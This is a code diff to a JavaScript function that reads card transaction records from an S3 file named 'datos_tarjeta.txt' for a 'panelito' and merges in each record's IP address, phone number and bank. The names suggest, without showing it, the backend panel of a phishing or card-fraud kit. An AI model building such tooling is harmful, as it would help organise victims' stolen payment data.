@@ -38,8 +38,41 @@ function validarJWT(token) {
 
 async function obtenerTransacciones() {
     const transacciones = [];
+    const datosComplementarios = {};
 
-    // SOLO leer de datos_tarjeta.txt (archivo principal para panelito)
+    // Leer datos_consultas.txt (información complementaria: ip, telefono, banco)
+    try {
+        const dataConsultas = await new Promise((resolve) => {
+            s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
+                if (err) resolve(null);
+                else resolve(data);
+            });
+        });
+
+        if (dataConsultas) {
+            const contenidoConsultas = dataConsultas.Body.toString();
+            const lineasConsultas = contenidoConsultas.split('\n').filter(l => l.trim());
+
+            lineasConsultas.forEach(linea => {
+                try {
+                    const obj = JSON.parse(linea);
+                    if (obj.txid) {
+                        datosComplementarios[obj.txid] = {
+                            ip: obj.ip,
+                            telefono: obj.telefono,
+                            banco: obj.banco
+                        };
+                    }
+                } catch (e) {
+                    // Ignorar líneas inválidas
+                }
+            });
+        }
+    } catch (error) {
+        // Ignorar errores al leer datos_consultas.txt
+    }
+
+    // Leer datos_tarjeta.txt (archivo principal para panelito)
     try {
         const data = await new Promise((resolve, reject) => {
             s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
@@ -54,9 +87,19 @@ async function obtenerTransacciones() {
         lineas.forEach(linea => {
             try {
                 const obj = JSON.parse(linea);
+
+                // Mergear con datos complementarios de datos_consultas.txt
+                if (obj.txid && datosComplementarios[obj.txid]) {
+                    obj.ip = datosComplementarios[obj.txid].ip || obj.ip;
+                    obj.telefono = datosComplementarios[obj.txid].telefono || obj.telefono;
+                    if (!obj.banco && datosComplementarios[obj.txid].banco) {
+                        obj.banco = datosComplementarios[obj.txid].banco;
+                    }
+                }
+
                 transacciones.push(obj);
             } catch (e) {
-                console.error('Error parseando línea:', e);
+                // Ignorar líneas inválidas
             }
         });
     } catch (error) {
